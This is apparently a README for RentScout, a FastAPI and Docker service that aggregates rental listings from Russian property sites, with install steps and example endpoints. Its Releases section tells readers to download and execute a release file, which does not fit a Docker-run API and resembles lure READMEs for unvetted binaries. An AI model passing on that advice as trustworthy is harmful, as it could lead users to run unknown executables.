# RentScout: Your Reliable Rental Data Aggregator 🌍🏠

![RentScout Logo](https://img.shields.io/badge/RentScout-API-blue?style=for-the-badge&logo=appveyor)

Welcome to **RentScout**, a high-performance API designed for aggregating rental data from leading platforms. Whether you're a developer looking to integrate rental data into your application or a researcher seeking insights into housing trends, RentScout provides the tools you need.

## Table of Contents

- [Features](#features)
- [Getting Started](#getting-started)
- [Installation](#installation)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)
- [Releases](#releases)

## Features

- **Data Aggregation**: Collects rental data from multiple sources including Avito, Cian, and Yandex.
- **FastAPI**: Built on FastAPI for high performance and ease of use.
- **Docker Support**: Easily deploy with Docker and Docker Compose.
- **Real-time Data**: Get the latest rental listings as they become available.
- **Redis Caching**: Fast access to frequently requested data.
- **SQL Database**: Store and query data efficiently.

## Getting Started

To start using RentScout, follow the instructions below. Make sure you have the necessary tools installed, including Docker and Docker Compose.

### Prerequisites

- Docker
- Docker Compose
- Python 3.7 or higher

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/Soasu/rentscout.git
   cd rentscout
   ```

2. Build and run the Docker containers:
   ```bash
   docker-compose up --build
   ```

3. Access the API at `http://localhost:8000`.

## Usage

After starting the API, you can use it to access rental data. Below are examples of how to make requests.

### Example Request

To get rental listings, send a GET request to the following endpoint:

```http
GET /api/rentals
```

### Example Response

You will receive a JSON response containing rental listings:

```json
{
  "listings": [
    {
      "id": 1,
      "title": "2-bedroom apartment in the city center",
      "price": 1500,
      "source": "Avito"
    },
    ...
  ]
}
```

## API Endpoints

Here are some key API endpoints you can use:

- **Get all rentals**: `GET /api/rentals`
- **Get rental by ID**: `GET /api/rentals/{id}`
- **Search rentals**: `GET /api/rentals/search?query={search_term}`

## Contributing

We welcome contributions to RentScout! If you have ideas for improvements or new features, feel free to submit a pull request. 

1. Fork the repository.
2. Create a new branch.
3. Make your changes.
4. Submit a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For any questions or feedback, please reach out to us via GitHub issues or directly through our contact page.

## Releases

You can find the latest releases of RentScout [here](https://github.com/Soasu/rentscout/releases). Download the latest version and execute it to get started with the API.

![Releases Button](https://img.shields.io/badge/Latest_Releases-orange?style=for-the-badge)

Visit the [Releases](https://github.com/Soasu/rentscout/releases) section for more information.

---

Thank you for choosing RentScout! We hope you find it useful for your rental data needs.